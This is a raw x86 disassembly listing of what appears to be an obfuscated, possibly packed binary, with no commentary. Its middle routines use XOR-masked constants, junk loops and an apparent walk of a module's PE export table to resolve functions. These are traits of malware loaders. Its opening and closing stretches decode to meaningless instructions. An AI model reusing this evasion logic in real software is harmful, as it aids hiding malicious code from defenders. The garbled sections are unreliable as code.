  40a1d7:	adc    al,BYTE PTR [edi*1-0x4cef17ac]
  40a1de:	fstp   QWORD PTR [edx]
  40a1e0:	into   
  40a1e1:	add    DWORD PTR [eax+0x7512b0f6],ebp
  40a1e7:	(bad)  
  40a1e8:	mov    WORD PTR [esi+0x794fdc67],fs
  40a1ee:	xor    al,0x2e
  40a1f0:	jle    0x40a254
  40a1f2:	aaa    
  40a1f3:	mov    bl,0x2c
  40a1f5:	mov    esi,0x6eb57c8b
  40a1fa:	cmp    eax,0x1201754d
  40a1ff:	(bad)  
  40a201:	ret    
  40a202:	mul    DWORD PTR [esi]
  40a204:	and    BYTE PTR [edi-0x271fc896],cl
  40a20a:	call   FWORD PTR [ebx+0x66bab050]
  40a210:	jge    0x40a22b
  40a212:	jecxz  0x40a283
  40a214:	push   ds
  40a215:	ror    eax,1
  40a217:	cli    
  40a218:	scas   eax,DWORD PTR es:[edi]
  40a219:	cmp    edi,esp
  40a21b:	or     BYTE PTR [ebx+edx*8],cl
  40a21e:	xor    eax,0xc944f471
  40a223:	adc    cl,ah
  40a225:	xchg   esi,eax
  40a226:	fcomp  QWORD PTR [ebp-0x53]
  40a229:	or     al,0x0
  40a22b:	ret    
  40a22c:	pop    esp
  40a22d:	xchg   esi,eax
  40a22e:	mov    eax,0xe95dd2cf
  40a233:	push   esp
  40a234:	jp     0x40a1e1
  40a236:	xor    eax,0xe3c8252d
  40a23b:	xchg   esi,eax
  40a23c:	jno    0x40a1cc
  40a23e:	fnstsw WORD PTR [edx]
  40a240:	dec    ebx
  40a241:	jl     0x40a1cd
  40a243:	lahf   
  40a244:	inc    edx
  40a245:	and    BYTE PTR [eax-0x7628e07b],bl
  40a24b:	mov    al,ds:0x5159bedf
  40a250:	cld    
  40a251:	cmp    eax,0x3bf072a2
  40a256:	(bad)  
  40a258:	js     0x40a1e7
  40a25a:	test   BYTE PTR [eax],bh
  40a25c:	(bad)  
  40a25d:	in     eax,0x64
  40a25f:	add    BYTE PTR [ebx-0x6ccf383],cl
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	xbegin 0xee17a5c
  40abdc:	push   es
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	cmp    DWORD PTR [ecx-0x41964a56],eax
  40abe9:	outs   dx,BYTE PTR ds:[esi]
  40abea:	jmp    0xe87e32a6
  40abef:	xchg   esi,eax
  40abf0:	mov    edi,0x8498a3c2
  40abf5:	push   edi
  40abf7:	lds    esp,FWORD PTR [edi-0x15]
  40abfa:	add    BYTE PTR [ebp-0x7df00206],bh
  40ac00:	push   edx
  40ac01:	cmp    al,0x9c
  40ac03:	das    
  40ac04:	out    0x23,al
  40ac06:	out    dx,al
  40ac07:	xchg   DWORD PTR [ebp+ebp*8-0x1355de53],edx
  40ac0e:	push   ds
  40ac0f:	jns    0x40abea
  40ac11:	cmp    al,0xe6
  40ac13:	fwait
  40ac14:	push   ecx
  40ac15:	adc    esp,DWORD PTR ds:0xd93477f
  40ac1b:	lods   al,BYTE PTR ds:[esi]
  40ac1c:	and    DWORD PTR [eax+0x66],edx
  40ac1f:	cli    
  40ac20:	adc    BYTE PTR [eax+0x1e684c28],0xba
  40ac27:	sub    BYTE PTR ds:0x3aba9bf4,cl
  40ac2d:	xor    bl,BYTE PTR [edi+0x39]
  40ac30:	inc    edx
  40ac31:	popf   
  40ac32:	mov    DWORD PTR [ebx+edi*2],ebx
  40ac35:	push   0xffffff8e
  40ac37:	mov    ebx,DWORD PTR [ecx-0x242560db]
  40ac3d:	dec    esp
  40ac3e:	mov    BYTE PTR [eax+0x5],ch
  40ac41:	dec    esi
  40ac42:	retf   
  40ac43:	fsub   QWORD PTR [ecx+0x30ef7e18]
  40ac49:	pusha  
  40ac4a:	adc    BYTE PTR [ebp+esi*8+0x63f31567],dl
  40ac51:	inc    esp
  40ac52:	fdivp  st(6),st
  40ac54:	cdq    
  40ac55:	repnz push ebx
  40ac57:	mov    dl,BYTE PTR [edx]
  40ac59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac5a:	mov    edx,DWORD PTR [ebp+0x33]
  40ac5d:	retf   0xbfb
  40ac60:	mov    ds:0x5e427c2b,al
  40ac65:	mov    WORD PTR [ebp-0x6a],es
  40ac68:	adc    edx,DWORD PTR [edi]
  40ac6a:	xchg   esp,eax
  40ac6b:	div    esi
  40ac6d:	fidivr DWORD PTR [eax]
  40ac6f:	xor    BYTE PTR [ecx+0x9],bl
  40ac72:	imul   ebp,edi,0xffffffa5
  40ac75:	inc    ecx
  40ac76:	fwait
  40ac77:	cs xchg ecx,eax
  40ac79:	cld    
  40ac7a:	sbb    al,0x4d
  40ac7c:	cmp    dl,dh
  40ac7e:	dec    edx
  40ac7f:	popa   
  40ac80:	call   0x77f214e4
  40ac85:	mov    eax,ds:0x8e9cfe07
  40ac8a:	outs   dx,BYTE PTR ds:[esi]
  40ac8b:	pop    ds
  40ac8c:	inc    esi
  40ac8d:	les    eax,FWORD PTR [esi-0x39]
  40ac90:	hlt    
